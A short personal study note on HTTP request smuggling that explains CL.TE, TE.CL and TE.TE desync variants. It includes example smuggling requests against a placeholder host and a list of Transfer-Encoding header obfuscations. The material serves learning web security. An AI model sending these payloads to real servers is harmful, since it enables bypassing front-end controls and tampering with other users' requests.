---
tags:
  - web
  - security
aliases:
  - CLTE
  - TECL
---
Abusing discrepancies between front end and back end servers handling of both:
- [[Content-Length]]
- [[Transfer-Encoding]]
headers to trigger request smuggling in the back end server.

Servers often disagree on behavior if both are present:
- Ignore content-length
- Ignore transfer-encoding
- Ignore transfer-encoding if it is malformed
# CL.TE
- Front-end sees Content-Length
- Back-end sees Transfer-Encoding
### Example
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
- Front-end sees whole request
- Back-end sees transfer-encoding and reads up to 0
# TE.CL
- Front-end sees Transfer-Encoding
- Back-end sees Content-Length
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
- Front end sees whole request
- Back end sees up to end of 8
# TE.TE
- Front-end and back end sees Transfer-Encoding but one of the servers can be induced to not process it by obfuscating the header
Methods to obfuscate header:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```